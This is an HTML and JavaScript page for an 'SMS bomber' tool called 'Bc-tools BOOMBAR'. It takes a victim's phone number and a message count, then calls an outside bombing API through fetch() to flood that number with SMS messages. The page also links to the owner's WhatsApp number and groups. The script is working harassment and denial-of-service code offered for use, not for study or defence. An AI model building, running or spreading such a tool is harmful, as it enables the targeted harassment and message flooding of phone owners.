<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Bc-tools boombar</title>
  <style>
    body {
      margin: 0;
      font-family: 'Courier New', monospace;
      background: linear-gradient(to right, black, red);
      color: white;
      text-align: center;
      padding: 20px;
    }

    h1 {
      font-size: 3em;
      text-shadow: 0 0 10px red;
      margin-bottom: 30px;
    }

    input, select, button {
      padding: 10px;
      margin: 10px;
      font-size: 1em;
      border-radius: 10px;
      border: none;
      width: 250px;
    }

    button {
      background-color: darkred;
      color: white;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:hover {
      background-color: crimson;
    }

    .link-buttons a {
      display: inline-block;
      margin: 10px;
      background: black;
      color: red;
      padding: 10px 20px;
      border-radius: 10px;
      text-decoration: none;
      font-weight: bold;
      box-shadow: 0 0 10px red;
    }

    .link-buttons a:hover {
      background: red;
      color: black;
    }

    .footer {
      margin-top: 40px;
      font-size: 1.2em;
      font-weight: bold;
      text-shadow: 0 0 10px white, 0 0 20px red;
    }
  </style>
</head>
<body>
  <h1>Bc-tools BOOMBAR</h1>
  
  <input type="text" id="number" placeholder="Enter Number e.g 5093802xxxx" /><br>
  <select id="amount">
    <option value="10">10</option>
    <option value="20">20</option>
    <option value="30">30</option>
    <option value="40">40</option>
    <option value="50">50</option>
    <option value="custom">Custom</option>
  </select><br>
  <input type="number" id="customAmount" placeholder="Enter Custom Amount" style="display:none;" /><br>

  <button onclick="boomb()">BOOOMBüí£üí•</button>
  <p id="statusMessage"></p>

  <div class="link-buttons">
    <a href="https://wa.me/50938025349" target="_blank">Contact Owner</a>
    <a href="https://whatsapp.com/channel/0029Vb01pp6ICVfhhRraMK22" target="_blank">Join WhatsApp Channel</a>
    <a href="https://chat.whatsapp.com/Bn2THIVsZb1LhksOYJqogb" target="_blank">Join WhatsApp Group</a>
  </div>

  <div class="footer">CREDIT : Supreme Destructor</div>

  <script>
    const amountSelect = document.getElementById("amount");
    const customInput = document.getElementById("customAmount");

    amountSelect.addEventListener("change", () => {
      customInput.style.display = amountSelect.value === "custom" ? "inline-block" : "none";
    });

    function boomb() {
      const number = document.getElementById("number").value;
      let amount = amountSelect.value;
      if (amount === "custom") {
        amount = document.getElementById("customAmount").value;
      }

      if (!number || !amount) {
        alert("Please enter number and amount.");
        return;
      }

      document.getElementById("statusMessage").textContent = "Boombing processing...";

      const url = `https://shadowtools.site/smsbomberapi/smsbomber.php?number=${number}&amount=1${amount}`;
      fetch(url)
        .then(response => response.text())
        .then(data => {
          document.getElementById("statusMessage").textContent = data;
        })
        .catch(error => {
          document.getElementById("statusMessage").textContent = "Procceedüëπ‚ò†Ô∏è.";
        });
    }
  </script>
</body>
</html>
